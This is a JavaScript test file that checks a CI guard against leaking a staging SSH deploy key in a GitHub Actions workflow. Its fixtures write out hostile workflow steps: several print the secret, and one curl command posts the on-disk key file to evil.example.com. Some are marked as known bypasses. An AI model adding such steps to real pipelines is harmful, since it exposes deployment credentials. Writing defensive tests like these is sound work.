'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');

// QA finding (KAN-12 PR #15, commit 7fbbf75): the reviewer's Major #4 asked for
// a guard covering an echo of the env-mapped shell variable ($STAGING_DEPLOY_KEY),
// not just a literal `echo ${{ secrets.X }}`. The first fix attempt added a
// line-scoped check ("does this line contain both the token and echo/printf/cat")
// to deploy-staging-workflow.test.js. QA showed that check only inspects a line
// if the literal token `$STAGING_DEPLOY_KEY` appears on it, AND only flags it if
// echo/printf/cat appears on that SAME line - so a heredoc body, a reassignment
// to a new variable, or an encoded copy (each spreading "read the secret" and
// "print it" across two lines) slipped through untouched. GitHub's own log
// masking doesn't save you either: it only redacts the exact raw secret string,
// not a renamed or transformed copy.
//
// The follow-up fix (still commit history on this branch) replaced that check
// entirely with a stricter allowlist: assert $STAGING_DEPLOY_KEY is referenced
// on exactly one line in the whole workflow, and that line must be the known
// write-to-file line. That closes all three bypasses at once, since each one
// requires an *extra* reference to the variable regardless of what it then does
// with the value - see "AC-6: $STAGING_DEPLOY_KEY is referenced nowhere except
// the single expected write-to-file line" in deploy-staging-workflow.test.js.
//
// This file copies that allowlist check verbatim (see `violatesGuard` below) and
// re-runs QA's three synthetic leak patterns against it as regression coverage:
// each must now be caught.

function violatesGuard(yaml) {
  const referencingLines = yaml.split('\n').filter((line) => /\$\{?STAGING_DEPLOY_KEY\}?/.test(line));
  if (referencingLines.length !== 1) return true;
  return !/^\s*printf\s+'%s\\n'\s+"\$STAGING_DEPLOY_KEY"\s*>\s*"\$HOME\/\.ssh\/staging_deploy_key"\s*$/.test(
    referencingLines[0]
  );
}

test('regression guard: a heredoc body that prints the key is now caught', () => {
  const evilStep = [
    '      - name: Debug SSH key (regression)',
    '        env:',
    '          STAGING_DEPLOY_KEY: ${{ secrets.STAGING_DEPLOY_KEY }}',
    '        run: |',
    '          cat <<EOF',
    '          $STAGING_DEPLOY_KEY',
    '          EOF',
  ].join('\n');

  assert.ok(violatesGuard(evilStep), 'the allowlist guard must flag a heredoc body referencing the key');
});

test('regression guard: renaming the secret to a new shell var before echoing it is now caught', () => {
  const evilStep = [
    '      - name: Debug SSH key (regression)',
    '        env:',
    '          STAGING_DEPLOY_KEY: ${{ secrets.STAGING_DEPLOY_KEY }}',
    '        run: |',
    '          KEY="$STAGING_DEPLOY_KEY"',
    '          echo "$KEY"',
  ].join('\n');

  assert.ok(
    violatesGuard(evilStep),
    'the allowlist guard must flag the reassignment line itself, regardless of what the new var is used for'
  );
});

test('regression guard: base64-encoding the key into a new var before echoing it is now caught', () => {
  const evilStep = [
    '      - name: Debug SSH key (regression)',
    '        env:',
    '          STAGING_DEPLOY_KEY: ${{ secrets.STAGING_DEPLOY_KEY }}',
    '        run: |',
    '          ENCODED=$(base64 <<< "$STAGING_DEPLOY_KEY")',
    '          echo "$ENCODED"',
  ].join('\n');

  assert.ok(
    violatesGuard(evilStep),
    'the allowlist guard must flag the line deriving ENCODED from the key, regardless of downstream use'
  );
});

test('sanity: the allowlist guard does not flag the real workflow', () => {
  const fs = require('node:fs');
  const path = require('node:path');
  const yaml = fs.readFileSync(path.join(__dirname, '..', '..', 'deploy-staging.yml'), 'utf8');
  assert.ok(!violatesGuard(yaml), 'the real deploy-staging.yml must pass its own guard');
});

// QA follow-up (KAN-12 PR #15, commit e2f1a7d review): the allowlist guard only
// ever looks for the literal token `$STAGING_DEPLOY_KEY` (with or without
// braces). That closes every leak that keeps typing that exact variable name,
// but a leak doesn't have to: the secret is also readable (a) under any OTHER
// env-mapped alias to the same `secrets.STAGING_DEPLOY_KEY`, since the guard
// never looks at the `env:` block at all, and (b) from the on-disk file the
// legit step already writes it to (`$HOME/.ssh/staging_deploy_key`), with no
// `$STAGING_DEPLOY_KEY` reference anywhere in the leaking step. Each of the
// three cases below is appended to the REAL workflow (not a synthetic
// fragment) and confirmed to slip past the guard untouched - these are new
// findings, not regressions of the three bypasses already fixed, and per QA
// instruction are reported without blocking this pass.

const fs = require('node:fs');
const path = require('node:path');
const REAL_WORKFLOW = fs.readFileSync(path.join(__dirname, '..', '..', 'deploy-staging.yml'), 'utf8');

test('KNOWN GAP: aliasing the secret to a second env: var name bypasses the guard entirely', () => {
  const evilStep = [
    '      - name: Debug (second env mapping)',
    '        env:',
    '          LEAKED_KEY: ${{ secrets.STAGING_DEPLOY_KEY }}',
    '        run: |',
    '          echo "$LEAKED_KEY"',
  ].join('\n');
  const injected = REAL_WORKFLOW + '\n' + evilStep + '\n';
  assert.ok(
    !violatesGuard(injected),
    'documents that the allowlist guard does NOT catch a second env: mapping under a different var name - ' +
      'it never inspects env: blocks, only literal $STAGING_DEPLOY_KEY references'
  );
});

test('KNOWN GAP: catting the on-disk key file bypasses the guard entirely (zero var references)', () => {
  const evilStep = [
    '      - name: Debug (cat the file)',
    '        run: |',
    '          cat "$HOME/.ssh/staging_deploy_key"',
  ].join('\n');
  const injected = REAL_WORKFLOW + '\n' + evilStep + '\n';
  assert.ok(
    !violatesGuard(injected),
    'documents that the allowlist guard does NOT catch a step that reads the already-written key file ' +
      'directly - it only guards references to the $STAGING_DEPLOY_KEY shell variable, not the file it was written to'
  );
});

test('KNOWN GAP: exfiltrating the on-disk key file (e.g. via curl) bypasses the guard entirely', () => {
  const evilStep = [
    '      - name: Exfil via curl reading file',
    '        run: |',
    '          curl -X POST --data-binary @"$HOME/.ssh/staging_deploy_key" https://evil.example.com/collect',
  ].join('\n');
  const injected = REAL_WORKFLOW + '\n' + evilStep + '\n';
  assert.ok(
    !violatesGuard(injected),
    'documents that the allowlist guard does NOT catch exfiltration of the on-disk key file with no ' +
      '$STAGING_DEPLOY_KEY reference at all - same root cause as the cat-the-file gap above'
  );
});
